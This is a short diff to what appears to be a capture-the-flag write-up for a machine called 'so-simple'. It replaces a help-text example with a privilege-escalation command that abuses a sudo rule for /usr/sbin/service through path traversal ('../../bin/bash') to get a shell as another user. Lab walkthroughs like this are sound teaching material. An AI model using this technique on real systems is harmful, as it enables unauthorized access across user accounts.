@@ -52,8 +52,8 @@ User max may run the following commands on so-simple:
 We can run as steven with the following:
 
 ```shell-session
-$ sudo -u steven /usr/sbin/service -h
-Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]
+max@box:~$ sudo -u steven /usr/sbin/service ../../bin/bash
+steven@box:/$ 
 
 ```
 
